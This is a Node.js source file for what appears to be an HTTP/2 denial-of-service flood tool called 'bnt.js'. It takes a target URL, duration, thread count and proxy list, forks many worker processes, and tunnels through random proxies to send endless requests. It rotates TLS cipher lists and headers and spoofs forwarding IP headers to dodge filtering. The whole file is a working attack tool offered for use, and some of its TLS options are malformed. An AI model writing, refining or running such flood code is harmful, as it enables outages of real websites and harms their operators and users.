const fs = require('fs');
const crypto = require('crypto');
const UserAgent = require('user-agents');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const url = require('url');
const cluster = require('cluster');
const { PassThrough } = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.on('uncaughtException', function(error) {});
process.on('unhandledRejection', function(error) {})

if (process.argv.length < 6) {
  console.clear();
  console.log("- bnt loves you <3\n- node bnt.js <url> <time> <threads> <proxies> optional(<rand>)");
  process.exit(0);
}

const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],
cache_header = [
    'no-cache',
    'max-age=0'
]


var target = process.argv[2];
var time = process.argv[3];
var threads = process.argv[4];
var proxy = process.argv[5];
var proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var parsed = url.parse(target);
const payload = {};
const userAgentv1 = new UserAgent();

if (cluster.isMaster) {
   console.clear();
	 console.log('- bnt loves you <3\n- started');
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
} else {
	class buildTLS {
		http2tun(ip) {
      const userAgentv2 = new UserAgent();
      if (process.argv[6] == "rand") {
        var useragent = 'CitizenFX/1'
      } else {
        var useragent = 'CitizenFX/1'
      }
			payload[':authority'] = parsed.host;
			payload[':method'] = 'GET';
			payload[':path'] = parsed.path;
			payload[':scheme'] = 'https';
			payload['accept'] = accept_header[Math.floor(Math.random() * accept_header.length)];
			payload['accept-encoding'] = 'gzip, deflate, br';
			payload['accept-language'] = 'en-US;q=0.8,en;q=0.7';
			payload['cache-control'] = cache_header[Math.floor(Math.random() * cache_header.length)];
			payload['user-agent'] = useragent;
      		payload['upgrade-insecure-requests'] = '1';
			// send data on url to server
			payload['x-forwarded-for'] = ip;
			payload['x-forwarded-host'] = parsed.host;
			payload['x-forwarded-proto'] = 'https';
			payload['x-real-ip'] = ip;
			payload['x-real-port'] = '443';
			payload['x-forwarded-port'] = '443';
			payload['x-forwarded-server'] = parsed.host;
			payload['x-original-uri'] = parsed.path;
					
			const client = http2.connect(parsed.href, {
			  createConnection: () => {
				return tls.connect({
				  socket: new JSStreamSocket(ip),
				  ciphers: cplist[Math.floor(Math.random() * cplist.length)],
				  host: parsed.host,
				  servername: parsed.host,
				  secure: true,
				  followAllRedirects: true,
				  echdCurve: "GREASE:X25519:x25519",
				  honorCipherOrder: true,
				  secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom	,
				  sigalgs: sigalgs[Math.floor(Math.random() * sigalgs.length)],
				  rejectUnauthorized: false,
				  ALPNProtocols: ['h2', 'http1.1', 'http%2F1.1', 'http/1.1'],
				}, () => {
						setInterval(async() => {
						  await client.request(payload).close()
						})
				})
			  }
			})
			client.setTimeout(80000);
		}
	}
	
	extBuild = new buildTLS();

	const keepAliveAgent = new http.Agent({
		keepAlive: true,
		keepAliveMsecs: 80000,
		maxSockets: Infinity
	});
	
	function flood() {
		for(let rs=0; rs < Math.floor(Math.random() * 10); rs++) { //DONT CHANGE
			
			var proxy = proxies[Math.floor(Math.random() * proxies.length)];
			proxy = proxy.split(':');
			
			var transfer = http.get({
				host: proxy[0],
				port: proxy[1],
				ciphers: cplist[Math.floor(Math.random() * cplist.length)],
				method: "CONNECT",
				agent: keepAliveAgent,
				path: parsed.host + ":443"				
			})
			
			transfer.end();
			
			transfer.on('connect', (res, transfer) => {	
				extBuild.http2tun(transfer);
			});
			
			transfer.on('end', () => {
			  transfer.resume();
			  transfer.close();
			})			
		}
	}
	setInterval(flood);
	setTimeout(function() {
	  console.clear();
	  process.exit()
	}, time * 1000);
}